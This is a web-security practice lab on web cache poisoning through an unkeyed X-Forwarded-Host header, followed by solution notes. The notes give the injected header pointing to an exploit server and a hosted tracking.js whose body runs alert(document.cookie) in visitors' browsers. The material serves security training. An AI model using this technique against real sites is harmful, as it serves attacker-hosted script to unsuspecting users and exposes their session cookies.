```
Lab: Web cache poisoning with an unkeyed header

PRACTITIONER

This lab is vulnerable to web cache poisoning because it handles input from an unkeyed header in an unsafe way.
An unsuspecting user regularly visits the site's home page.
To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
```

X-Forwarded-Host: exploit-0af500bc03f1605e8088526401d600f4.exploit-server.net/exploit
File: /exploit/resources/js/tracking.js
Body: alert(document.cookie);

---
